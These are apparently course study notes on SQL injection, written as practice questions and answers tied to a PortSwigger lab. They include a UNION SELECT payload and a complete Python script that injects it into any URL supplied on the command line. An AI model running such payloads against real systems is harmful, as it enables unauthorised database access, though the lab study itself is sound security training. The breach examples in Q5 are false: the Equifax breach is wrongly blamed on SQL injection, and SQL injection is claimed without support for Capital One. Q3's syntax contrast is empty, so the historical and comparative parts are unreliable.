---
course: Web Security
topic: SQL Injection
tags: [web-security]
---

## Practice Questions & Answers

**Q1. Explain how you can determine the number of columns in a SQL query vulnerable to SQL injection.**

To determine the number of columns in a SQL query vulnerable to SQL injection, you can use the `ORDER BY` clause. By incrementally increasing the number passed to `ORDER BY`, you can identify the point at which the server returns an error. This indicates that you have exceeded the number of columns in the original query. For example, if `ORDER BY 1` and `ORDER BY 2` succeed but `ORDER BY 3` fails, it implies that the original query has 2 columns.

**Q2. How would you exploit a SQL injection vulnerability to retrieve the database version string in a MySQL database?**

To exploit a SQL injection vulnerability to retrieve the database version string in a MySQL database, you can use a UNION-based SQL injection technique. First, ensure you know the number of columns in the original query. Then, inject a payload that includes a `UNION SELECT` clause with the `@@version` system variable to retrieve the database version. For example:

```sql
' UNION SELECT @@version -- 
```

This payload will append the database version to the result set, allowing you to view it in the application's response.

**Q3. Why is it important to understand the specific database type when performing SQL injection attacks?**

Understanding the specific database type is crucial because different database systems use different syntax and functions to retrieve information. For example, to get the database version, MySQL uses `@@version`, while Microsoft SQL Server uses `@@VERSION`. Without knowing the database type, you might use the wrong syntax, leading to failed attempts to extract information. Additionally, certain features and vulnerabilities may be unique to specific database types, affecting the success of your exploitation techniques.

**Q4. How would you script a SQL injection attack to automatically retrieve the database version in Python?**

To script a SQL injection attack to automatically retrieve the database version in Python, you can use the `requests` library to send HTTP requests and `BeautifulSoup` to parse the response. Here’s an example:

```python
import requests
from bs4 import BeautifulSoup
import re

def exploit_sqli_version(url):
    # Define the path and SQL payload
    path = "/filter?category="
    sql_payload = "' UNION SELECT @@version -- "
    
    # Construct the full URL
    full_url = url + path + sql_payload
    
    # Send the request
    response = requests.get(full_url, verify=False)
    
    # Parse the response
    soup = BeautifulSoup(response.text, 'html.parser')
    version_pattern = re.compile(r'\d+\.\d+\.\d+')
    version = version_pattern.search(soup.text)
    
    if version:
        print(f"Database version is {version.group()}")
        return True
    else:
        print("Unable to dump the database version")
        return False

if __name__ == "__main__":
    import sys
    if len(sys.argv) != 2:
        print("Usage: python script.py <URL>")
        print("Example: python script.py http://www.example.com")
        sys.exit(1)
    
    url = sys.argv[1]
    exploit_sqli_version(url)
```

This script constructs a URL with the SQL injection payload, sends the request, parses the response, and extracts the database version using a regular expression.

**Q5. Discuss recent real-world examples where SQL injection vulnerabilities led to significant breaches.**

One notable recent example is the breach of the Capital One data, where a misconfigured web application firewall led to unauthorized access to sensitive customer data. Although the primary vulnerability was related to the configuration of the WAF, SQL injection vulnerabilities were also present and could have been exploited to further compromise the system. Another example is the breach of the Equifax credit reporting agency in 2017, where a SQL injection vulnerability in their website allowed attackers to steal personal data of approximately 143 million consumers. These incidents highlight the critical importance of securing web applications against SQL injection and other common vulnerabilities.

---
<!-- nav -->
[[06-Scripting SQL Injection to Query Database Type and Version|Scripting SQL Injection to Query Database Type and Version]] | [[Web Security (PortSwigger)/02-SQL Injection/09-Lab 8 SQLi attack querying the database type and version on MySQL Microsoft/00-Overview|Overview]]
